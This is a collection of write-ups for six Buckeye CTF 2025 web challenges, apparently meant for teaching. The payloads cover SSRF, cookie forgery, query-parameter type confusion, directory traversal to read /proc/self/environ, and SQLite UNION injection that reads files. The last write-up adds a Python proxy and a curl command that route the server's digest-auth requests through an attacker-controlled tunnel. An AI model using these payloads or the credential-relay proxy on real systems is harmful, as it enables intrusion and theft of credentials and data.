# Buckeye CTF 2025 web writeups

## web/ebg13

This is a good web challenge to start with. Use the help button to ask for a hint if you get stuck.

V znqr na ncc gung yrgf lbh ivrj gur ebg13 irefvba bs nal jrofvgr!

https://ebg13.challs.pwnoh.io



</br>

**TL;DR** 

We exploited a Server‑Side Request Forgery (SSRF): we made the challenge server fetch its own admin page (http://127.0.0.1:3000/admin) using the vulnerable endpoint /ebj13. The server returned the admin response with its text ROT13‑encoded; we then ROT13‑decoded it to get the flag.

Why this is SSRF — short reasoning

On the given source code we see the server reads a ?url= parameter from the request:

``` const { url } = req.query;```

Then it performs the request server-side:

``const res = await fetch(url);
const html = await res.text();
``

Because fetch(url) runs on the backend, any URL we supply is requested by the server itself — that is the SSRF primitive.


**Why /admin contains the flag**

The server defines an admin route that returns the flag only when the request comes from localhost:

``
if (req.ip === "127.0.0.1" || req.ip === "::1" || req.ip === "::ffff:127.0.0.1") {
  return reply.type('text/html').send(`Hello self! The flag is ${FLAG}.`)
}   
``


</br>

**The exploit**

```https://ebg13.challs.pwnoh.io/ebj13?url=http://127.0.0.1:3000/admin```


**What happens:**

The challenge server receives your request to /ebj13 with url=http://127.0.0.1:3000/admin.

Server does fetch('http://127.0.0.1:3000/admin') → hits its local /admin.

/admin responds with Hello self! The flag is <FLAG>.

Server ROT13s text nodes, returns ROT13 like this


```bash
Uryyb frys! Gur synt vf opgs{jung_unccraf_vs_v_hfr_guvf_jrofvgr_ba_vgfrys}.
```

and can just decode it and get the flag

Flag:
```bash
bctf{what_happens_if_i_use_this_website_on_itself}
```


</br>

#
## web/Ramesses

This is a good web challenge to start with. Use the help button to ask for a hint if you get stuck.

Do you dare enter the tomb of Pharaoh Dave Ramesses?

https://ramesses.challs.pwnoh.io

</br>

**Analyze the Login Request**

We start by looking at the HTTP request made when logging in:
```html
POST / HTTP/1.1
Host: ramesses.challs.pwnoh.io
Content-Type: application/x-www-form-urlencoded

name=w3rew0lf&password=whomi

```

After logging in, the server responds with:

``Set-Cookie: session=eyJuYW1lIjogInczcmV3MGxmIiwgImlzX3BoYXJhb2giOiBmYWxzZX0=; Path=/
``

</br>

**Inspect the Cookie**

The cookie value:
``
eyJuYW1lIjogInczcmV3MGxmIiwgImlzX3BoYXJhb2giOiBmYWxzZX0=

``
This looks like Base64-encoded data.

It’s common in web apps for session data to be encoded JSON, which the server uses to identify the user.


**Decode the Cookie**

```bash
echo "eyJuYW1lIjogInczcmV3MGxmIiwgImlzX3BoYXJhb2giOiBmYWxzZX0=" | base64 -d

```

output:

```json
{"name": "w3rew0lf", "is_pharaoh": false}

```

**Understand the Vulnerability**

The cookie is not signed or encrypted, only Base64-encoded.

This is a classic Insecure Direct Object Reference (IDOR) / cookie tampering scenario:

We can edit the cookie directly and the server will accept it.

The key insight: the "is_pharaoh" field controls access to /tomb.

**Modify the Cookie**

Change "is_pharaoh": false → "is_pharaoh": true
```json
{"name": "w3rew0lf", "is_pharaoh": true}

```
Re-encode this modified JSON in Base64.

```bash
echo -n '{"name": "w3rew0lf", "is_pharaoh": true}' | base64
```

output:
```bash

eyJuYW1lIjogInczcmV3MGxmIiwgImlzX3BoYXJhb2giOiB0cnVlfQ==

```

replace the original cookie with it and we get the flag on visiting /tomb as a pharaoh displays:


```bash
Pharaoh w3rew0lf
What a happy day! Heaven and earth rejoice, for thou art the great lord of Egypt.
All lands say unto him: The flag is bctf{s0_17_w45_wr177en_50_1t_w45_d0n3}


```

flag: 
```bash
bctf{s0_17_w45_wr177en_50_1t_w45_d0n3}
```


#
## web/Big chungus 

The challenge presents a website where the displayed page depends on the length of the username query parameter.
If the length is extremely large, the server reveals the BIG CHUNGUS page containing the flag.
Otherwise, it shows the little chungus template.

</br>

Our goal: Make the server believe username.length is bigger than the threshold


**Source Code Behavior (Important Part)**

The key logic (reverse-engineered or assumed):

```
if (req.query.username.length > 0xB16_C4A6A5) {
    // Render BIG CHUNGUS page with FLAG
} else {
    // Render little chungus page
}
```

So the condition depends entirely on:

```
req.query.username.length
```
In Node.js / Express, query parameters like:

```
?username[length]=1234
```
will be parsed into an object:

```
{
  username: {
     length: "1234"
  }
}
```

Thus req.query.username.length becomes "1234", not the length of a string—but the server still uses it in the numeric comparison, and JS coerces "1234" → 1234.

We can exploit this to force the server to think the username is extremely large.

Initial Idea: Prototype Pollution?
Initially, prototype pollution was suspected because many CTFs use:
```
username[__proto__][length]=999...
```
However — this challenge didn’t require prototype pollution.
It was far simpler.

**Final Exploit**

Just craft the query parameter so the server parses username as an object with a huge .length value:

Payload:
```
https://big-chungus.challs.pwnoh.io/?username[length]=10000000000000000000000
```

This makes Express interpret req.query as:
```
req.query = {
  username: {
     length: "10000000000000000000000"
  }
}
```
Then the comparison becomes:
```
10000000000000000000000 > 0xB16_C4A6A5  // TRUE
```
So the server returns the BIG CHUNGUS page.

Flag

The BIG CHUNGUS page reveals:
```
bctf{b16_chun6u5_w45_n3v3r_7h15_b16}
```

#
## web/awklet 

The Awklet challenge provided a web interface that dynamically renders ASCII-styled text using different “fonts.” Under the hood, the backend script was written in AWK, and the font parameter could be influenced via the URL.

The goal was to identify a vulnerability in the AWK script and exploit it to read sensitive data — ultimately retrieving the flag.

**Initial Analysis**

Navigating to:
https://awklet.challs.pwnoh.io/

reveals a simple form where users input:

    A name
    A font selection

However, when inspecting the backend endpoint, we see the script being executed at:

```/cgi-bin/awklet.awk```

By viewing the source of the invoked script using a crafted query:
```
view-source:https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?name=test&font=default
```
…we learn that the backend AWK script contains a function called load_font, which loads files directly from the filesystem based on the font parameter.

This becomes the primary attack surface.

**Vulnerability: LFI via load_font**

The font parameter was insufficiently sanitized, allowing Local File Inclusion (LFI).
Because the AWK script attempts to read a font file like:

```fonts/<font>.awk```
We can traverse directories using ../../../ and break the .awk extension using a null byte injection (%00), a classic trick for old CGI-based file handling.

This allows us to make the backend read arbitrary files on the server.

**Proof of Concept (PoC)**

The working payload was:
```bash
https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?name=+&font=../../../proc/self/environ%00
```

**Why /proc/self/environ?**

This file contains environment variables of the running process

Many CTF challenges embed flags inside env variables when running CGI scripts

AWK executes with that same environment

And indeed — the flag is revealed there.

Flag:
```
bctf{n3xt_t1m3_1m_wr171ng_1t_1n_53d}
```

**Lessons Learned**

AWK-based CGI scripts can be extremely risky if user input is used in file paths.

Null byte injection (%00) can still be relevant in some CGI environments.

/proc/self/environ remains a goldmine for LFI exploitation.

Directory traversal + file extension bypass = powerful combination.


#
## web/packages
The website allows browsing packages by specifying the Linux distribution:
```
/?distro=ubuntu&package=xyz
```

The result page suggested that the website performs a SQL query like:
```
SELECT name, version, description, source
FROM packages
WHERE distro = "<user_input>";
```
This immediately raises suspicion:
Is distro vulnerable to SQL injection?

Yes. It was

Detecting SQL Injection

Testing:
```
/?distro="
```

produced an error → confirming unsanitized string concatenation.

Next, test column count using UNION:
```
" UNION SELECT 1--
" UNION SELECT 1,2--
" UNION SELECT 1,2,3--
" UNION SELECT 1,2,3,4--
```

The backend accepted 4 columns.
Determine Database Engine

Testing SQLite-specific syntax:
```
" UNION SELECT sqlite_version(),NULL,NULL,NULL--
```
This worked → confirming the backend used SQLite.

*SQLite is interesting because:*

It normally cannot read files

BUT if load_extension is enabled, we can load dynamic libraries (dangerous!)

Some CTF environments include the fileio extension, which exposes:
```
readfile('/path')
writefile('/path', data)
```

and we want to read file for the flag because we can see that there is flag.txt in the challange folder we get as source code and the program is reading it 

**So our goal becomes:**

Load the fileio extension

Then

Read /app/flag.txt 

Try loading fileio

SQLite lets you load extensions like:
```
SELECT load_extension('/sqlite/ext/misc/fileio');
```
Test through SQL injection:
```
/?distro="+UNION+SELECT+NULL,NULL,NULL,load_extension('/sqlite/ext/misc/fileio')--+-
```
If fileio loads successfully, SQLite now supports:
```
readfile('/path')
```
**Read the Flag File**

Now that fileio is loaded, we can call:
```
SELECT readfile('/app/flag.txt');
```

Final SQLi payload:
```
/?distro="+UNION+SELECT+NULL,NULL,NULL,readfile('/app/flag.txt')--+-
```
URL-encoded final working exploit:
```
https://packages.challs.pwnoh.io/?distro=%22+UNION+SELECT+NULL,NULL,NULL,readfile(%27/app/flag.txt%27)--+-&package=
```
Result

This returned the contents of:
```/app/flag.txt```
which contained the flag.

Flag:
```
bctf{y0uv3_g0t_4n_apt17ud3_f0r_7h15}
```

#
## web/AUTHMAN

A Flask web application implementing HTTP Digest authentication where the goal is to retrieve the flag from a protected endpoint.

**source code analysis:**

config.py - Configuration with random credentials:
```
class FlaskConfig:
    SECRET_KEY = token_hex(32)
    AUTH_USERS = {
        "keno": token_urlsafe(16),
        "tenk": token_urlsafe(16)
    }
    FLAG = os.environ.get('FLAG','bctf{fake_flag_for_testing}')
```

routes.py - The vulnerable endpoint:

```
@app.route('/api/check',methods=['GET'])
def check():
    (user, pw), *_ = app.config['AUTH_USERS'].items()
    res = requests.get(r.referrer + '/auth',  # VULNERABLE LINE
        auth = HTTPDigestAuth(user,pw),
        timeout=3
    )
    return jsonify({'status':res.status_code})
```

auth.html - Protected endpoint containing the flag:

```
@app.route('/auth',methods=['GET'])
@auth.login_required
def auth():
    return render_template("auth.html",flag=app.config['FLAG'])
```

**The Vulnerability**

SSRF with Automatic Authentication

The critical vulnerability is in the /api/check endpoint:
```
res = requests.get(r.referrer + '/auth', auth = HTTPDigestAuth(user,pw))
```

This creates a Server-Side Request Forgery (SSRF) with automatic HTTP Digest authentication where:

The Referer header is user-controlled

The server automatically adds valid authentication credentials

The request is made to Referer + '/auth'

**Failed Approaches**

*1. Direct Credential Capture & Replay*

Attempt: Capture Digest auth headers and replay them to /auth
Result: Failed - Digest authentication uses server-specific nonces that prevent replay attacks

*2. Redirect-Based Attacks*

Attempt: Redirect authenticated requests to the real /auth endpoint
Result: Failed - Browsers/proxies don't forward Authorization headers on redirects

*The Working Solution: Credential Forwarding Proxy
Attack Concept*

Instead of trying to reuse captured credentials, we make the server authenticate against itself through our controlled proxy:

Server → Our Proxy (with auth) → Real /auth endpoint

Real server processes its own valid credentials

Proxy captures the authenticated response containing the flag

**Exploit Server Code**
```
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/auth':
            # Forward request to real /auth endpoint with all headers
            headers = {k: v for k, v in self.headers.items() 
                      if k.lower() not in ['host', 'content-length']}
            
            response = requests.get(
                'https://authman.challs.pwnoh.io/auth',
                headers=headers,
                verify=False
            )
            
            print("COMPLETE RESPONSE:")
            print(response.text)
            
            # Return response to client
            self.send_response(response.status_code)
            for key, value in response.headers.items():
                self.send_header(key, value)
            self.end_headers()
            self.wfile.write(response.content)
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')

if __name__ == '__main__':
    HTTPServer(('0.0.0.0', 80), ExploitHandler).serve_forever()
```

**Execution Steps**

Deploy the proxy server with public access (using Cloudflare Tunnel):

```
cloudflared tunnel --url http://localhost:80
```
Trigger the exploit:
```
curl -H "Referer: https://your-subdomain.trycloudflare.com" \
     "https://authman.challs.pwnoh.io/api/check"
```

**What Happens**

Request Flow:

Your request to /api/check with controlled Referer header
Server makes authenticated request to your-proxy.com/auth
Your proxy forwards request to authman.challs.pwnoh.io/auth WITH auth headers
Real server processes its own valid credentials
Your proxy receives the flag in the response

</br>
Authentication Bypass:

The server authenticates to your proxy with valid credentials
Your proxy forwards these credentials to the real endpoint
The real server validates its own credentials successfully
Flag is returned in the authenticated response


**Why This Works**

Digest Auth Nuance

Digest authentication prevents direct credential replay due to nonce/time limitations
However, when the server authenticates to itself through a proxy, it generates valid nonces for that specific request
The proxy acts as a transparent conduit for valid authentication


SSRF Exploitation

The vulnerability allows:

Controlling the destination of authenticated requests
Seeing the responses from protected endpoints
Making the server authenticate against arbitrary URLs

Flag
```
bctf{a_new_dog_learns_old_tricks}
```